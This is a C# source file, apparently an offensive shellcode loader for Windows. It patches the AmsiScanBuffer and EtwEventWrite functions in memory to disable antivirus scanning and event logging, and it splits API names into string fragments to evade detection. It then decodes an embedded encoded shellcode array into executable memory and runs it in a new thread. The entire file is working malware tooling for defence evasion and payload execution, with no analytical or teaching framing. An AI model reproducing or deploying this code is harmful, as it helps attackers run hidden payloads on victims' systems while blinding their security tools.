using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1 {
	
	public class PatchAMSIAndETW
	{
		
		[DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		private static void PatchETW()
		{
			try 
			{
				byte[] patchbyte = new byte[0];
        if (IntPtr.Size == 4)
				{
            string patchbytestring2 = "33,c0," + "c2,14,00";
            string[] patchbytestring = patchbytestring2.Split(',');
            patchbyte = new byte[patchbytestring.Length];
            for (int i = 0; i < patchbytestring.Length; i++)
						{
                patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
            }
        }else 
				{
            string patchbytestring2 = "48,3" + "3,C0,C3";
            string[] patchbytestring = patchbytestring2.Split(',');
            patchbyte = new byte[patchbytestring.Length];
            for (int i = 0; i < patchbytestring.Length; i++)
						{
                patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
            }
        }
				var enteeediiielel = LoadLibrary(("ntd" + "ll.dll"));
	      var etwEventSend = GetProcAddress(enteeediiielel, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
				uint oldProtect;
				VirtualProtect(etwEventSend, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
        Marshal.Copy(patchbyte, 0, etwEventSend, patchbyte.Length);
			}catch (Exception e)
			{
				Console.WriteLine(" [!] {0}", e.Message);
				Console.WriteLine(" [!] {0}", e.InnerException);
			}
		}

	    private static void PatchAMSI()
			{
	        try {
							LoadLibrary("A" + "m" + "s" + "i" + "." + "d" + "ll");
	            byte[] patchbyte = new byte[0];
	            if (IntPtr.Size == 4)
							{
	                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
	                string[] patchbytestring = patchbytestring2.Split(',');
	                patchbyte = new byte[patchbytestring.Length];
	                for (int i = 0; i < patchbytestring.Length; i++)
									{
	                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
	                }
	            }else
							{
	                string patchbytestring2 = "B8,57,00,07,80,C3";
	                string[] patchbytestring = patchbytestring2.Split(',');
	                patchbyte = new byte[patchbytestring.Length];
	                for (int i = 0; i < patchbytestring.Length; i++)
									{
	                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
	                }
	            }
							var enteeediiielel = LoadLibrary(("ams" + "i.dll"));
				      var etwEventSend = GetProcAddress(enteeediiielel, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
							uint oldProtect;
							VirtualProtect(etwEventSend, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
			        Marshal.Copy(patchbyte, 0, etwEventSend, patchbyte.Length);
	        }catch (Exception e)
					{
	            Console.WriteLine(" [!] {0}", e.Message);
	            Console.WriteLine(" [!] {0}", e.InnerException);
	        }
	    }

	    public static void Mein()
			{
	        PatchAMSI();
	        PatchETW();
	    }
	}
	
	class Program{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[] {0x11, 0x5d, 0x98, 0xf9, 0x05, 0xfd, 0xd5, 0x15, 0x15, 0x15, 0x56, 0x66, 0x56, 0x65, 0x67, 0x66, 0x6b, 0x5d, 0x46, 0xe7,
			0x7a, 0x5d, 0xa0, 0x67, 0x75, 0x5d, 0xa0, 0x67, 0x2d, 0x5d, 0xa0, 0x67, 0x35, 0x5d, 0xa0, 0x87, 0x65, 0x5d, 0x24, 0xcc,
			0x5f, 0x5f, 0x62, 0x46, 0xde, 0x5d, 0x46, 0xd5, 0xc1, 0x51, 0x76, 0x91, 0x17, 0x41, 0x35, 0x56, 0xd6, 0xde, 0x22, 0x56,
			0x16, 0xd6, 0xf7, 0x02, 0x67, 0x56, 0x66, 0x5d, 0xa0, 0x67, 0x35, 0xa0, 0x57, 0x51, 0x5d, 0x16, 0xe5, 0xa0, 0x95, 0x9d,
			0x15, 0x15, 0x15, 0x5d, 0x9a, 0xd5, 0x89, 0x7c, 0x5d, 0x16, 0xe5, 0x65, 0xa0, 0x5d, 0x2d, 0x59, 0xa0, 0x55, 0x35, 0x5e,
			0x16, 0xe5, 0xf8, 0x6b, 0x5d, 0x14, 0xde, 0x56, 0xa0, 0x49, 0x9d, 0x5d, 0x16, 0xeb, 0x62, 0x46, 0xde, 0x5d, 0x46, 0xd5,
			0xc1, 0x56, 0xd6, 0xde, 0x22, 0x56, 0x16, 0xd6, 0x4d, 0xf5, 0x8a, 0x06, 0x61, 0x18, 0x61, 0x39, 0x1d, 0x5a, 0x4e, 0xe6,
			0x8a, 0xed, 0x6d, 0x59, 0xa0, 0x55, 0x39, 0x5e, 0x16, 0xe5, 0x7b, 0x56, 0xa0, 0x21, 0x5d, 0x59, 0xa0, 0x55, 0x31, 0x5e,
			0x16, 0xe5, 0x56, 0xa0, 0x19, 0x9d, 0x5d, 0x16, 0xe5, 0x56, 0x6d, 0x56, 0x6d, 0x73, 0x6e, 0x6f, 0x56, 0x6d, 0x56, 0x6e,
			0x56, 0x6f, 0x5d, 0x98, 0x01, 0x35, 0x56, 0x67, 0x14, 0xf5, 0x6d, 0x56, 0x6e, 0x6f, 0x5d, 0xa0, 0x27, 0xfe, 0x6c, 0x14,
			0x14, 0x14, 0x72, 0x5d, 0xcf, 0x16, 0x15, 0x15, 0x15, 0x15, 0x15, 0x15, 0x15, 0x5d, 0xa2, 0xa2, 0x16, 0x16, 0x15, 0x15,
			0x56, 0xcf, 0x46, 0xa0, 0x84, 0x9c, 0x14, 0xea, 0xd0, 0xf5, 0x32, 0x3f, 0x1f, 0x56, 0xcf, 0xbb, 0xaa, 0xd2, 0xb2, 0x14,
			0xea, 0x5d, 0x98, 0xd9, 0x3d, 0x51, 0x1b, 0x91, 0x1f, 0x95, 0x10, 0xf5, 0x8a, 0x1a, 0xd0, 0x5c, 0x28, 0x87, 0x84, 0x7f,
			0x15, 0x6e, 0x56, 0x9e, 0xef, 0x14, 0xea, 0x78, 0x76, 0x81, 0x78, 0x43, 0x7a, 0x8d, 0x7a, 0x15};
			
			int size = buf.Length;
			
			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40); 
			
			Marshal.Copy(buf, 0, addr, size);
			
			buf = new byte[0];
			
			int key = 123456789; // key used to encode the shellcode
			
			IntPtr ptr;
			byte[] baite = new byte[1] { 0x90 };
			for (int i = 0; i < size; i++)
			{
				ptr = IntPtr.Add(addr, i);
				Marshal.Copy(ptr, baite, 0, 1);
				baite[0] = (byte)(((uint)baite[0] - key) & 0xFF);
				Marshal.Copy(baite, 0, ptr, 1);
			}
			
			PatchAMSIAndETW.Mein();
			
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}